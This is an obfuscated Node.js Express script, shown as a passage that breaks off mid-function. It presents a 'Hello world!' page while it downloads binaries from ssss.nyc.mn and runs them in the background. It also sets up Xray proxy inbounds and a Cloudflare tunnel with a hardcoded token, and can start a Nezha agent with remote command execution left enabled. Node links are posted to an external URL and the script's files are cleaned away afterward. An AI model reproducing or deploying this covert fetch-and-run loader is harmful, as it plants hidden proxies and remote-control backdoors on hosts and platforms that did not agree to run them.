const _0x4b92de=_0x1968;(function(_0x4802a5,_0x1eddbe){const _0x1a4637={_0x46ae1c:0x118,_0x4a8669:0x136,_0x52bdf2:0x181,_0x34a432:0x144,_0x16283f:0x11a},_0x1ef79b=_0x1968,_0x74c0c8=_0x4802a5();while(!![]){try{const _0xb7b8c7=-parseInt(_0x1ef79b(_0x1a4637._0x46ae1c))/0x1+parseInt(_0x1ef79b(0x145))/0x2+parseInt(_0x1ef79b(0x191))/0x3+-parseInt(_0x1ef79b(0x1c4))/0x4*(-parseInt(_0x1ef79b(_0x1a4637._0x4a8669))/0x5)+parseInt(_0x1ef79b(0x197))/0x6*(-parseInt(_0x1ef79b(_0x1a4637._0x52bdf2))/0x7)+-parseInt(_0x1ef79b(0x154))/0x8*(-parseInt(_0x1ef79b(_0x1a4637._0x34a432))/0x9)+-parseInt(_0x1ef79b(_0x1a4637._0x16283f))/0xa;if(_0xb7b8c7===_0x1eddbe)break;else _0x74c0c8['push'](_0x74c0c8['shift']());}catch(_0x1373e2){_0x74c0c8['push'](_0x74c0c8['shift']());}}}(_0x2a9b,0xc52e5));const express=require('express'),app=express(),axios=require(_0x4b92de(0x1b7)),os=require('os'),fs=require('fs'),path=require(_0x4b92de(0x1ae)),{promisify}=require(_0x4b92de(0x12b)),exec=promisify(require(_0x4b92de(0x182))[_0x4b92de(0x159)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4b92de(0x186)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4b92de(0x186)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x4b92de(0x186)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x4b92de(0x186)][_0x4b92de(0x1d4)]||'./tmp',SUB_PATH=process['env'][_0x4b92de(0x14a)]||_0x4b92de(0x17a),PORT=process[_0x4b92de(0x186)][_0x4b92de(0x1c0)]||process[_0x4b92de(0x186)][_0x4b92de(0x1c7)]||0xbb8,UUID=process['env'][_0x4b92de(0x11b)]||'9afd1137-b893-40c1-32dd-51e7ce206483',NEZHA_SERVER=process[_0x4b92de(0x186)][_0x4b92de(0x138)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4b92de(0x186)][_0x4b92de(0x135)]||'',ARGO_DOMAIN=process[_0x4b92de(0x186)][_0x4b92de(0x1d9)]||_0x4b92de(0x120),ARGO_AUTH=process[_0x4b92de(0x186)][_0x4b92de(0x1a2)]||_0x4b92de(0x19c),ARGO_PORT=process[_0x4b92de(0x186)][_0x4b92de(0x19f)]||0x1f41,CFIP=process[_0x4b92de(0x186)][_0x4b92de(0x150)]||_0x4b92de(0x1a8),CFPORT=process['env'][_0x4b92de(0x1bc)]||0x1bb,NAME=process['env'][_0x4b92de(0x1d6)]||'koyeb.';!fs[_0x4b92de(0x195)](FILE_PATH)?(fs[_0x4b92de(0x11f)](FILE_PATH),console['log'](FILE_PATH+_0x4b92de(0x1b8))):console['log'](FILE_PATH+_0x4b92de(0x1bf));function generateRandomName(){const _0xb87d66={_0x11b915:0x1d7,_0x55e2c3:0x127},_0x534eff=_0x4b92de,_0x514d85=_0x534eff(_0xb87d66._0x11b915);let _0x2ab65c='';for(let _0x42ec74=0x0;_0x42ec74<0x6;_0x42ec74++){_0x2ab65c+=_0x514d85['charAt'](Math[_0x534eff(_0xb87d66._0x55e2c3)](Math['random']()*_0x514d85[_0x534eff(0x18d)]));}return _0x2ab65c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4b92de(0x121)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x4b92de(0x121)](FILE_PATH,webName),botPath=path[_0x4b92de(0x121)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4b92de(0x1ce)),listPath=path[_0x4b92de(0x121)](FILE_PATH,_0x4b92de(0x179)),bootLogPath=path['join'](FILE_PATH,_0x4b92de(0x1da)),configPath=path[_0x4b92de(0x121)](FILE_PATH,_0x4b92de(0x122));function deleteNodes(){const _0x395e92={_0x1f19d0:0x15e,_0x54843a:0x123,_0x15a420:0x199,_0x45c651:0x18d,_0x2de6e3:0x174,_0x784b60:0x1b2},_0xf44cf=_0x4b92de;try{if(!UPLOAD_URL)return;if(!fs[_0xf44cf(0x195)](subPath))return;let _0x4b4c95;try{_0x4b4c95=fs[_0xf44cf(0x1c5)](subPath,_0xf44cf(_0x395e92._0x1f19d0));}catch{return null;}const _0x15c627=Buffer['from'](_0x4b4c95,'base64')['toString'](_0xf44cf(_0x395e92._0x1f19d0)),_0x3748c6=_0x15c627[_0xf44cf(_0x395e92._0x54843a)]('\x0a')[_0xf44cf(_0x395e92._0x15a420)](_0xa92239=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xf44cf(0x162)](_0xa92239));if(_0x3748c6[_0xf44cf(_0x395e92._0x45c651)]===0x0)return;return axios['post'](UPLOAD_URL+_0xf44cf(0x140),JSON[_0xf44cf(_0x395e92._0x2de6e3)]({'nodes':_0x3748c6}),{'headers':{'Content-Type':_0xf44cf(0x187)}})[_0xf44cf(_0x395e92._0x784b60)](_0x3d9c21=>{return null;}),null;}catch(_0x5ed436){return null;}}function cleanupOldFiles(){const _0x58b407={_0x2c1353:0x151},_0xf94a8e=_0x4b92de;try{const _0x24d0a7=fs[_0xf94a8e(_0x58b407._0x2c1353)](FILE_PATH);_0x24d0a7[_0xf94a8e(0x156)](_0x4a32e1=>{const _0x22e847=_0xf94a8e,_0x18668e=path['join'](FILE_PATH,_0x4a32e1);try{const _0x2e2c26=fs['statSync'](_0x18668e);_0x2e2c26[_0x22e847(0x116)]()&&fs[_0x22e847(0x12f)](_0x18668e);}catch(_0x169dc5){}});}catch(_0x35c6b6){}}app[_0x4b92de(0x19d)]('/',function(_0x1f4329,_0x12453e){const _0x300b9d=_0x4b92de;_0x12453e[_0x300b9d(0x139)](_0x300b9d(0x143));});async function generateConfig(){const _0x47cb65={_0x213ef5:0x1a6,_0x5cbaf3:0x1c3,_0x3241b8:0x1bb,_0x49fdb2:0x1c3,_0x2758e2:0x19e,_0x34e066:0x168,_0x3ea983:0x1cd,_0x3a24de:0x1cd,_0x2d3c78:0x1b5,_0x6894d1:0x1b0,_0xec4083:0x148,_0x53268e:0x168,_0x5ab3cf:0x1cf,_0x518947:0x1b5,_0x9f11d6:0x178,_0x5d90e7:0x1aa,_0xb574b7:0x16c,_0x5d5df1:0x122},_0x494694=_0x4b92de,_0x5d8157={'log':{'access':_0x494694(_0x47cb65._0x213ef5),'error':_0x494694(_0x47cb65._0x213ef5),'loglevel':_0x494694(_0x47cb65._0x5cbaf3)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x494694(_0x47cb65._0x3241b8),'settings':{'clients':[{'id':UUID,'flow':_0x494694(0x1b4)}],'decryption':_0x494694(_0x47cb65._0x49fdb2),'fallbacks':[{'dest':0xbb9},{'path':_0x494694(_0x47cb65._0x2758e2),'dest':0xbba},{'path':_0x494694(_0x47cb65._0x34e066),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x494694(_0x47cb65._0x3ea983)}},{'port':0xbb9,'listen':_0x494694(0x1b5),'protocol':_0x494694(_0x47cb65._0x3241b8),'settings':{'clients':[{'id':UUID}],'decryption':_0x494694(_0x47cb65._0x49fdb2)},'streamSettings':{'network':_0x494694(_0x47cb65._0x3a24de),'security':_0x494694(_0x47cb65._0x5cbaf3)}},{'port':0xbba,'listen':_0x494694(_0x47cb65._0x2d3c78),'protocol':_0x494694(_0x47cb65._0x3241b8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x494694(0x1c3),'wsSettings':{'path':_0x494694(_0x47cb65._0x2758e2)}},'sniffing':{'enabled':!![],'destOverride':[_0x494694(_0x47cb65._0x6894d1),_0x494694(0x1cf),_0x494694(_0x47cb65._0xec4083)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x494694(_0x47cb65._0x2d3c78),'protocol':_0x494694(0x192),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x494694(_0x47cb65._0x53268e)}},'sniffing':{'enabled':!![],'destOverride':[_0x494694(_0x47cb65._0x6894d1),_0x494694(_0x47cb65._0x5ab3cf),_0x494694(_0x47cb65._0xec4083)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x494694(_0x47cb65._0x518947),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x494694(0x1c3),'wsSettings':{'path':_0x494694(_0x47cb65._0x9f11d6)}},'sniffing':{'enabled':!![],'destOverride':[_0x494694(0x1b0),_0x494694(_0x47cb65._0x5ab3cf),_0x494694(0x148)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x494694(_0x47cb65._0x5d90e7),'tag':_0x494694(0x18c)},{'protocol':_0x494694(_0x47cb65._0xb574b7),'tag':'block'}]};fs[_0x494694(0x13b)](path[_0x494694(0x121)](FILE_PATH,_0x494694(_0x47cb65._0x5d5df1)),JSON['stringify'](_0x5d8157,null,0x2));}function getSystemArchitecture(){const _0x3016c2={_0x1aec56:0x166,_0x34acf8:0x184,_0x3c65b2:0x14f},_0x172940=_0x4b92de,_0x35a670=os[_0x172940(_0x3016c2._0x1aec56)]();return _0x35a670===_0x172940(0x14f)||_0x35a670===_0x172940(0x16a)||_0x35a670===_0x172940(_0x3016c2._0x34acf8)?_0x172940(_0x3016c2._0x3c65b2):'amd';}function _0x2a9b(){const _0x56171b=['6352929bspcIl','2061294IaSzwJ','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','substring','quic','win32','SUB_PATH','\x20>/dev/null\x202>&1','tunnel.json','TunnelSecret','Unknown','arm','CFIP','readdirSync','log','base64','8xZUBWC','/tunnel.yml\x20run','forEach','unlink','https://arm64.ssss.nyc.mn/agent','exec','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Unhandled\x20error\x20in\x20startserver:','data','https://arm64.ssss.nyc.mn/bot','utf-8','del\x20/f\x20/q\x20','443','post','test','\x0a\x0avmess://','--tls','countryCode','arch','includes','/vmess-argo','platform','arm64','\x20-c\x20','blackhole','push','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://ipapi.co/json/','from','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x0atrojan://','Download\x20','stringify','\x20>\x20nul\x202>&1','\x22\x20>\x20/dev/null\x202>&1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/trojan-argo','list.txt','sub','nohup\x20','response','Empowerment\x20failed\x20for\x20','?security=tls&sni=','ArgoDomain:','rm\x20-rf\x20','5628UfcQBK','child_process','2096','aarch64','basename','env','application/json','/api/add-nodes','http://ip-api.com/json/','chmod','2087','direct','length','unshift','\x0avless://','pkill\x20-f\x20\x22[','3363036jrRtJD','vmess','pipe','createWriteStream','existsSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','3846fhucwL','\x20-s\x20','filter','\x0a\x20\x20\x20\x20','match','eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiYmNhZDc2M2UtYzhhOC00YTI1LWJiYmItYjYxZDFmZmMwNmY2IiwicyI6IlpqVXdORGRqTVRJdE1XWmpNQzAwWlRGaExUaG1OVEl0TVRBek1XRmlPRFEyT0dFMSJ9','get','/vless-argo','ARGO_PORT','\x20>/dev/null\x202>&1\x20&','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','ARGO_DOMAIN:','taskkill\x20/f\x20/im\x20','stream','/dev/null','&path=%2Fvless-argo%3Fed%3D2560#','cdns.doon.eu.org','App\x20is\x20running','freedom','2053','?encryption=none&security=tls&sni=','NEZHA\x20variable\x20is\x20empty,skip\x20running','path','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','http','https://oooo.serv00.net/add-url','catch','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','xtls-rprx-vision','127.0.0.1','clear','axios','\x20is\x20created','npm\x20running\x20error:\x20','country_code','vless','CFPORT','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','listen','\x20already\x20exists','SERVER_PORT','org','all','none','32568ntNVSJ','readFileSync','https://arm64.ssss.nyc.mn/v1','PORT','\x20-c\x20\x22','toString','Content-Type','fileUrl','finish','tcp','sub.txt','tls','web\x20running\x20error:\x20','http\x20server\x20is\x20running\x20on\x20port:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.yml','FILE_PATH','https://amd64.ssss.nyc.mn/v1','NAME','abcdefghijklmnopqrstuvwxyz','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_DOMAIN','boot.log','isFile','charAt','1348792iTILLa','Subscription\x20uploaded\x20successfully','9347950nPaiKn','UUID','message','\x20is\x20running','Add\x20automatic\x20access\x20task\x20faild:\x20','mkdirSync','koyeb.hndz.qzz.io','join','config.json','split','close','map','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','floor','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20tunnel:\x20','config.yaml','util','\x0aclient_secret:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2083','unlinkSync','/sub.txt\x20saved\x20successfully','\x20failed:\x20','/api/add-subscriptions','status','success','NEZHA_KEY','460uCMiBE','8443','NEZHA_SERVER','send','true','writeFileSync','&fp=firefox&type=ws&host=','Error\x20executing\x20command:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/api/delete-nodes','pop','error','Hello\x20world!'];_0x2a9b=function(){return _0x56171b;};return _0x2a9b();}function downloadFile(_0x5dac00,_0x3753f7,_0x364c19){const _0x14f5b3={_0x241575:0x195,_0x5a988c:0x194,_0x76229b:0x1a5,_0x329e70:0x1b2},_0x14a5fb={_0x5f03f7:0x185,_0xebb4d0:0x131,_0x2a7c54:0x142},_0x21b87b={_0x160ef9:0x142},_0x3155f2=_0x4b92de,_0x40fdff=_0x5dac00;!fs[_0x3155f2(_0x14f5b3._0x241575)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x57931a=fs[_0x3155f2(_0x14f5b3._0x5a988c)](_0x40fdff);axios({'method':_0x3155f2(0x19d),'url':_0x3753f7,'responseType':_0x3155f2(_0x14f5b3._0x76229b)})['then'](_0x3cdbb1=>{const _0x3beb51={_0x29b227:0x157,_0xfca845:0x173,_0x3a3986:0x185},_0x3329a1=_0x3155f2;_0x3cdbb1[_0x3329a1(0x15c)][_0x3329a1(0x193)](_0x57931a),_0x57931a['on'](_0x3329a1(0x1cc),()=>{const _0x38c21c=_0x3329a1;_0x57931a[_0x38c21c(0x124)](),console['log']('Download\x20'+path['basename'](_0x40fdff)+'\x20successfully'),_0x364c19(null,_0x40fdff);}),_0x57931a['on'](_0x3329a1(_0x21b87b._0x160ef9),_0x4d003c=>{const _0x4dfe68=_0x3329a1;fs[_0x4dfe68(_0x3beb51._0x29b227)](_0x40fdff,()=>{});const _0x5823e2=_0x4dfe68(_0x3beb51._0xfca845)+path[_0x4dfe68(_0x3beb51._0x3a3986)](_0x40fdff)+'\x20failed:\x20'+_0x4d003c['message'];console['error'](_0x5823e2),_0x364c19(_0x5823e2);});})[_0x3155f2(_0x14f5b3._0x329e70)](_0x56e73f=>{const _0x373a92=_0x3155f2,_0x4d2dfa='Download\x20'+path[_0x373a92(_0x14a5fb._0x5f03f7)](_0x40fdff)+_0x373a92(_0x14a5fb._0xebb4d0)+_0x56e73f['message'];console[_0x373a92(_0x14a5fb._0x2a7c54)](_0x4d2dfa),_0x364c19(_0x4d2dfa);});}async function downloadFilesAndRun(){const _0x5cc379={_0x3509aa:0x18d,_0x494a8f:0x152,_0x44d9b4:0x1af,_0x1283f7:0x142,_0xb6a931:0x160,_0x284660:0x13a,_0x5753ef:0x13f,_0x561952:0x1b3,_0x428d2c:0x121,_0x713c9d:0x12a,_0x2ef02d:0x17b,_0x431002:0x1c8,_0x246c45:0x152,_0x409087:0x11d,_0x43f633:0x137,_0x1a18a5:0x17b,_0x28d65a:0x198,_0x111790:0x142,_0x341cec:0x1ad,_0x53aac3:0x16b,_0x23981a:0x11d,_0x13a043:0x142,_0x121c13:0x1d0,_0x212eeb:0x195,_0x36f6b9:0x19b,_0x41ace6:0x1d2,_0x5dd4f8:0x155,_0x238bf8:0x1a0,_0x312ae9:0x152},_0x454c3f={_0x33358c:0x156},_0x44660b={_0x1a11a8:0x195,_0x7f5c27:0x18a},_0x497593={_0x5bfd5b:0x1cb},_0x2810dc=_0x4b92de,_0x29283d=getSystemArchitecture(),_0x2565ba=getFilesForArchitecture(_0x29283d);if(_0x2565ba[_0x2810dc(_0x5cc379._0x3509aa)]===0x0){console[_0x2810dc(_0x5cc379._0x494a8f)](_0x2810dc(_0x5cc379._0x44d9b4));return;}const _0x332e6c=_0x2565ba[_0x2810dc(0x125)](_0x315a61=>{return new Promise((_0x37e0f9,_0x3804df)=>{const _0x10f148=_0x1968;downloadFile(_0x315a61['fileName'],_0x315a61[_0x10f148(_0x497593._0x5bfd5b)],(_0x3a83a9,_0x3ddd52)=>{_0x3a83a9?_0x3804df(_0x3a83a9):_0x37e0f9(_0x3ddd52);});});});try{await Promise[_0x2810dc(0x1c2)](_0x332e6c);}catch(_0xc4866){console[_0x2810dc(_0x5cc379._0x1283f7)]('Error\x20downloading\x20files:',_0xc4866);return;}function _0xef0df4(_0xebfb4d){const _0x14aa41=_0x2810dc,_0x4fd6fd=0x1fd;_0xebfb4d[_0x14aa41(_0x454c3f._0x33358c)](_0x20c961=>{const _0x4ebcdb={_0x5871b5:0x152},_0x3bb6e8=_0x14aa41;fs[_0x3bb6e8(_0x44660b._0x1a11a8)](_0x20c961)&&fs[_0x3bb6e8(_0x44660b._0x7f5c27)](_0x20c961,_0x4fd6fd,_0x38f7b2=>{const _0x3fe96d=_0x3bb6e8;_0x38f7b2?console[_0x3fe96d(0x142)](_0x3fe96d(0x17d)+_0x20c961+':\x20'+_0x38f7b2):console[_0x3fe96d(_0x4ebcdb._0x5871b5)]('Empowerment\x20success\x20for\x20'+_0x20c961+':\x20'+_0x4fd6fd[_0x3fe96d(0x1c9)](0x8));});});}const _0x2b534e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xef0df4(_0x2b534e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x122c96=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2810dc(0x123)](':')[_0x2810dc(0x141)]():'',_0x436f3a=new Set([_0x2810dc(_0x5cc379._0xb6a931),_0x2810dc(0x137),'2096','2087','2083','2053']),_0x15bb7d=_0x436f3a['has'](_0x122c96)?_0x2810dc(_0x5cc379._0x284660):'false',_0x265253=_0x2810dc(0x12c)+NEZHA_KEY+_0x2810dc(0x12d)+NEZHA_SERVER+_0x2810dc(_0x5cc379._0x5753ef)+_0x15bb7d+_0x2810dc(_0x5cc379._0x561952)+UUID;fs[_0x2810dc(0x13b)](path[_0x2810dc(_0x5cc379._0x428d2c)](FILE_PATH,_0x2810dc(_0x5cc379._0x713c9d)),_0x265253);const _0x507de3=_0x2810dc(_0x5cc379._0x2ef02d)+phpPath+_0x2810dc(_0x5cc379._0x431002)+FILE_PATH+_0x2810dc(0x177);try{await exec(_0x507de3),console[_0x2810dc(_0x5cc379._0x246c45)](phpName+_0x2810dc(_0x5cc379._0x409087)),await new Promise(_0x33df94=>setTimeout(_0x33df94,0x3e8));}catch(_0x258e30){console[_0x2810dc(0x142)]('php\x20running\x20error:\x20'+_0x258e30);}}else{let _0x2004e0='';const _0x39362e=[_0x2810dc(0x160),_0x2810dc(_0x5cc379._0x43f633),_0x2810dc(0x183),_0x2810dc(0x18b),_0x2810dc(0x12e),_0x2810dc(0x1ab)];_0x39362e['includes'](NEZHA_PORT)&&(_0x2004e0=_0x2810dc(0x164));const _0x20fb89=_0x2810dc(_0x5cc379._0x1a18a5)+npmPath+_0x2810dc(_0x5cc379._0x28d65a)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2004e0+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x20fb89),console[_0x2810dc(0x152)](npmName+'\x20is\x20running'),await new Promise(_0x306f69=>setTimeout(_0x306f69,0x3e8));}catch(_0x4dbf38){console[_0x2810dc(_0x5cc379._0x111790)](_0x2810dc(0x1b9)+_0x4dbf38);}}}else console[_0x2810dc(0x152)](_0x2810dc(_0x5cc379._0x341cec));const _0x26aa01='nohup\x20'+webPath+_0x2810dc(_0x5cc379._0x53aac3)+FILE_PATH+_0x2810dc(0x1a1);try{await exec(_0x26aa01),console[_0x2810dc(0x152)](webName+_0x2810dc(_0x5cc379._0x23981a)),await new Promise(_0x5530a0=>setTimeout(_0x5530a0,0x3e8));}catch(_0x22917d){console[_0x2810dc(_0x5cc379._0x13a043)](_0x2810dc(_0x5cc379._0x121c13)+_0x22917d);}if(fs[_0x2810dc(_0x5cc379._0x212eeb)](botPath)){let _0x17b123;if(ARGO_AUTH[_0x2810dc(0x19b)](/^[A-Z0-9a-z=]{120,250}$/))_0x17b123=_0x2810dc(0x126)+ARGO_AUTH;else ARGO_AUTH[_0x2810dc(_0x5cc379._0x36f6b9)](/TunnelSecret/)?_0x17b123=_0x2810dc(_0x5cc379._0x41ace6)+FILE_PATH+_0x2810dc(_0x5cc379._0x5dd4f8):_0x17b123='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2810dc(0x17b)+botPath+'\x20'+_0x17b123+_0x2810dc(_0x5cc379._0x238bf8)),console[_0x2810dc(_0x5cc379._0x312ae9)](botName+_0x2810dc(0x11d)),await new Promise(_0x1b75a4=>setTimeout(_0x1b75a4,0x7d0));}catch(_0x23262d){console['error']('Error\x20executing\x20command:\x20'+_0x23262d);}}await new Promise(_0x10eab2=>setTimeout(_0x10eab2,0x1388));}function getFilesForArchitecture(_0x3fee8f){const _0x13d9ba={_0x4c2b11:0x158,_0x1d53ac:0x18e,_0xdced84:0x14f,_0xde0e4b:0x1c6},_0xda8fb2=_0x4b92de;let _0x41ec5b;_0x3fee8f===_0xda8fb2(0x14f)?_0x41ec5b=[{'fileName':webPath,'fileUrl':_0xda8fb2(0x128)},{'fileName':botPath,'fileUrl':_0xda8fb2(0x15d)}]:_0x41ec5b=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x25c7d4=_0x3fee8f===_0xda8fb2(0x14f)?_0xda8fb2(_0x13d9ba._0x4c2b11):'https://amd64.ssss.nyc.mn/agent';_0x41ec5b[_0xda8fb2(_0x13d9ba._0x1d53ac)]({'fileName':npmPath,'fileUrl':_0x25c7d4});}else{const _0x554f90=_0x3fee8f===_0xda8fb2(_0x13d9ba._0xdced84)?_0xda8fb2(_0x13d9ba._0xde0e4b):_0xda8fb2(0x1d5);_0x41ec5b[_0xda8fb2(0x18e)]({'fileName':phpPath,'fileUrl':_0x554f90});}}return _0x41ec5b;}function argoType(){const _0x1b4b98={_0x11df02:0x13b,_0x31d423:0x121,_0x55015d:0x14c,_0x4528f5:0x16e,_0x30771e:0x15a,_0x3133d6:0x1bd},_0x57544e=_0x4b92de;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x57544e(0x167)](_0x57544e(0x14d))){fs[_0x57544e(_0x1b4b98._0x11df02)](path[_0x57544e(_0x1b4b98._0x31d423)](FILE_PATH,_0x57544e(0x14c)),ARGO_AUTH);const _0x1fbed4=_0x57544e(0x129)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x57544e(_0x1b4b98._0x55015d))+_0x57544e(_0x1b4b98._0x4528f5)+ARGO_DOMAIN+_0x57544e(0x196)+ARGO_PORT+_0x57544e(_0x1b4b98._0x30771e);fs[_0x57544e(_0x1b4b98._0x11df02)](path[_0x57544e(_0x1b4b98._0x31d423)](FILE_PATH,_0x57544e(0x1d3)),_0x1fbed4);}else console[_0x57544e(0x152)](_0x57544e(_0x1b4b98._0x3133d6));}async function extractDomains(){const _0x3fc42f={_0x6a8174:0x1c5,_0xc4ea77:0x1da,_0x1dba98:0x123,_0x127813:0x156,_0x2295ab:0x17f,_0x3b3b67:0x1d8,_0x154da7:0x11d,_0x15a25b:0x13d},_0x4194af={_0x5d873a:0x16f,_0x2b4d5b:0x15c,_0x2fc318:0x15c,_0x3a917f:0x1ba,_0x30c085:0x1c1,_0x1a2b8f:0x19d,_0x468fa2:0x133,_0x3a9304:0x134,_0x47ad99:0x14e},_0x288843={_0x3e9226:0x1a4,_0x384498:0x190,_0x5cab20:0x147},_0x2720be={_0xc42075:0x19b,_0x3ea24e:0x16d},_0x482a13=_0x4b92de;let _0x4aa56a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4aa56a=ARGO_DOMAIN,console['log'](_0x482a13(0x1a3),_0x4aa56a),await _0x5b3f52(_0x4aa56a);else try{const _0x13e0cf=fs[_0x482a13(_0x3fc42f._0x6a8174)](path['join'](FILE_PATH,_0x482a13(_0x3fc42f._0xc4ea77)),'utf-8'),_0x1bc3c7=_0x13e0cf[_0x482a13(_0x3fc42f._0x1dba98)]('\x0a'),_0x16a70c=[];_0x1bc3c7[_0x482a13(_0x3fc42f._0x127813)](_0x16eacb=>{const _0x37ad74=_0x482a13,_0x5dfb39=_0x16eacb[_0x37ad74(_0x2720be._0xc42075)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5dfb39){const _0x3dfa61=_0x5dfb39[0x1];_0x16a70c[_0x37ad74(_0x2720be._0x3ea24e)](_0x3dfa61);}});if(_0x16a70c[_0x482a13(0x18d)]>0x0)_0x4aa56a=_0x16a70c[0x0],console['log'](_0x482a13(_0x3fc42f._0x2295ab),_0x4aa56a),await _0x5b3f52(_0x4aa56a);else{console[_0x482a13(0x152)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x482a13(0x121)](FILE_PATH,_0x482a13(0x1da)));async function _0x18e69e(){const _0x19034c=_0x482a13;try{process['platform']===_0x19034c(0x149)?await exec(_0x19034c(_0x288843._0x3e9226)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x19034c(_0x288843._0x384498)+botName[_0x19034c(0x117)](0x0)+']'+botName[_0x19034c(_0x288843._0x5cab20)](0x1)+_0x19034c(0x176));}catch(_0x2f6633){}}_0x18e69e(),await new Promise(_0x4bb73d=>setTimeout(_0x4bb73d,0xbb8));const _0x40bb44='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x482a13(_0x3fc42f._0x3b3b67)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x40bb44+_0x482a13(0x1a0)),console['log'](botName+_0x482a13(_0x3fc42f._0x154da7)),await new Promise(_0x19df86=>setTimeout(_0x19df86,0xbb8)),await extractDomains();}catch(_0x5280a9){console[_0x482a13(0x142)](_0x482a13(_0x3fc42f._0x15a25b)+_0x5280a9);}}}catch(_0x35359c){console[_0x482a13(0x142)]('Error\x20reading\x20boot.log:',_0x35359c);}async function _0x24fdd4(){const _0x1fe42a=_0x482a13;try{const _0x484b93=await axios['get'](_0x1fe42a(_0x4194af._0x5d873a),{'timeout':0xbb8});if(_0x484b93[_0x1fe42a(_0x4194af._0x2b4d5b)]&&_0x484b93[_0x1fe42a(_0x4194af._0x2b4d5b)][_0x1fe42a(0x1ba)]&&_0x484b93[_0x1fe42a(0x15c)][_0x1fe42a(0x1c1)])return _0x484b93[_0x1fe42a(_0x4194af._0x2fc318)][_0x1fe42a(_0x4194af._0x3a917f)]+'_'+_0x484b93[_0x1fe42a(0x15c)][_0x1fe42a(_0x4194af._0x30c085)];}catch(_0x311e41){try{const _0x47c17e=await 